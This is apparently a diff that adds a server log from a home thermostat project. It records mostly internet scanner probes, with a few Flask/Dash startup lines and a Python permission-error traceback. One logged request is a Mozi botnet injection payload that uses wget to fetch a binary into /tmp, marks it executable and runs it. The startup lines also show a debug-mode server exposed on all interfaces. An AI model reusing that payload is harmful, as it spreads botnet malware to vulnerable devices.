@@ -1,0 +1,66 @@
+88.214.24.59 - - [20/Dec/2022 02:11:46] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00+&à\x00\x00\x00\x00\x00Cookie:')
+134.209.18.70 - - [20/Dec/2022 03:05:45] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03+>:uÍj\x06_)\x15È#¯å/c¸å_½î\x12\x89Þ\x90&\x19òÛ\x08\x98\x16\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+134.209.18.70 - - [20/Dec/2022 03:05:46] code 400, message Bad request version ('À\x14À')
+162.142.125.212 - - [20/Dec/2022 04:48:29] code 505, message Invalid HTTP version (2.0)
+167.94.146.60 - - [20/Dec/2022 05:35:56] code 505, message Invalid HTTP version (2.0)
+/home/tomginsberg/thermos/controller.py:35: RuntimeWarning: This channel is already in use, continuing anyway.  Use GPIO.setwarnings(False) to disable warnings.
+  GPIO.setup(self.relay_pin, GPIO.OUT)
+Dash is running on http://0.0.0.0:8050/
+
+ * Serving Flask app 'liveplot'
+ * Debug mode: on
+Dash is running on http://0.0.0.0:8050/
+
+ * Serving Flask app 'liveplot'
+ * Debug mode: on
+31.220.88.155 - - [30/Jan/2024 04:23:07] code 400, message Bad request version ("¯mê7\x14\x02\x12\x9eù\x93W\x00Þ\x13\x01\x13\x02\x13\x03\x13\x04\x13\x05À,À0\x00£\x00\x9fÌ©Ì¨ÌªÀ¯À\xadÀ£À\x9fÀ]ÀaÀWÀS\x00§À+À/\x00¢\x00\x9eÀ®À¬À¢À\x9eÀ\\À`ÀVÀR\x00¦À$À(\x00k\x00jÀsÀw\x00Ä\x00Ã\x00m\x00ÅÀ#À'\x00g\x00@ÀrÀv\x00¾\x00½\x00l\x00¿À")
+61.163.152.203 - - [30/Jan/2024 04:54:35] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
+206.189.124.250 - - [30/Jan/2024 06:06:25] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01ý\x01\x00\x01ù\x03\x03m0ä×\x82\xad4\x03ÑÀ/O\x9b`øßqò')
+64.62.197.94 - - [30/Jan/2024 07:26:36] code 400, message Bad request version ('À\x14À')
+185.170.144.3 - - [30/Jan/2024 09:38:11] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+162.142.125.216 - - [30/Jan/2024 10:07:19] code 505, message Invalid HTTP version (2.0)
+167.94.138.35 - - [30/Jan/2024 13:37:24] code 505, message Invalid HTTP version (2.0)
+162.243.132.58 - - [30/Jan/2024 16:48:45] code 400, message Bad request syntax ('MGLNDD_24.212.130.154_80')
+198.235.24.120 - - [30/Jan/2024 19:04:25] code 400, message Bad request version ('À\x13À')
+198.235.24.120 - - [30/Jan/2024 19:04:26] code 400, message Bad request version ('À(À$À\x14À')
+167.248.133.126 - - [30/Jan/2024 20:15:03] code 505, message Invalid HTTP version (2.0)
+167.248.133.126 - - [30/Jan/2024 20:18:54] code 505, message Invalid HTTP version (2.0)
+167.94.145.59 - - [30/Jan/2024 21:00:11] code 505, message Invalid HTTP version (2.0)
+172.105.128.11 - - [30/Jan/2024 23:17:54] code 400, message Bad request version ('À\x14À')
+74.82.47.4 - - [31/Jan/2024 03:45:21] code 400, message Bad request version ('À\x14À')
+78.153.140.224 - - [31/Jan/2024 05:56:27] code 400, message Bad request version ('\x00\x9eÀ(À$À\x14À')
+5.188.210.227 - - [31/Jan/2024 13:19:49] code 400, message Bad request syntax ('\x05\x01\x00')
+5.188.210.227 - - [31/Jan/2024 13:19:55] code 400, message Bad request syntax ('\x05\x01\x00')
+5.188.210.227 - - [31/Jan/2024 13:20:01] code 400, message Bad request syntax ('\x05\x01\x00')
+5.188.210.227 - - [31/Jan/2024 13:23:18] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+5.188.210.227 - - [31/Jan/2024 13:23:26] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+5.188.210.227 - - [31/Jan/2024 13:23:32] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+162.142.125.221 - - [31/Jan/2024 16:30:58] code 505, message Invalid HTTP version (2.0)
+181.214.166.113 - - [31/Jan/2024 19:47:01] code 400, message Bad request syntax ('o\x06ô\x84\x9a\x14ó®\x96=7û¨sqh')
+66.240.205.34 - - [31/Jan/2024 22:12:47] code 400, message Bad request version ('ô')
+78.153.140.175 - - [31/Jan/2024 22:30:25] code 400, message Bad request version ('¡b\x814`\x06ê³káÆá\x05ì½ãeK\x81¦óß\x03úXð\x9b\x9f¡Zã\x90\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+45.79.181.223 - - [31/Jan/2024 23:38:15] code 400, message Bad request version ('À\x14À')
+205.210.31.215 - - [01/Feb/2024 00:08:58] code 400, message Bad request version ('À\x13À')
+205.210.31.215 - - [01/Feb/2024 00:08:59] code 400, message Bad request version ('À(À$À\x14À')
+152.32.183.231 - - [01/Feb/2024 02:35:13] code 400, message Bad request version ('À\x13À')
+152.32.183.231 - - [01/Feb/2024 02:35:14] code 400, message Bad HTTP/0.9 request type ('t3')
+78.153.140.177 - - [01/Feb/2024 02:55:28] code 400, message Bad request version ('²()Ä\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+61.219.11.155 - - [01/Feb/2024 03:01:11] code 400, message Bad request version ('À\x14À')
+Traceback (most recent call last):
+  File "/usr/lib/python3.9/runpy.py", line 197, in _run_module_as_main
+    return _run_code(code, main_globals, None,
+  File "/usr/lib/python3.9/runpy.py", line 87, in _run_code
+    exec(code, run_globals)
+  File "/usr/lib/python3.9/http/server.py", line 1289, in <module>
+    test(
+  File "/usr/lib/python3.9/http/server.py", line 1244, in test
+    with ServerClass(addr, HandlerClass) as httpd:
+  File "/usr/lib/python3.9/socketserver.py", line 452, in __init__
+    self.server_bind()
+  File "/usr/lib/python3.9/http/server.py", line 1287, in server_bind
+    return super().server_bind()
+  File "/usr/lib/python3.9/http/server.py", line 138, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib/python3.9/socketserver.py", line 466, in server_bind
+    self.socket.bind(self.server_address)
+PermissionError: [Errno 13] Permission denied
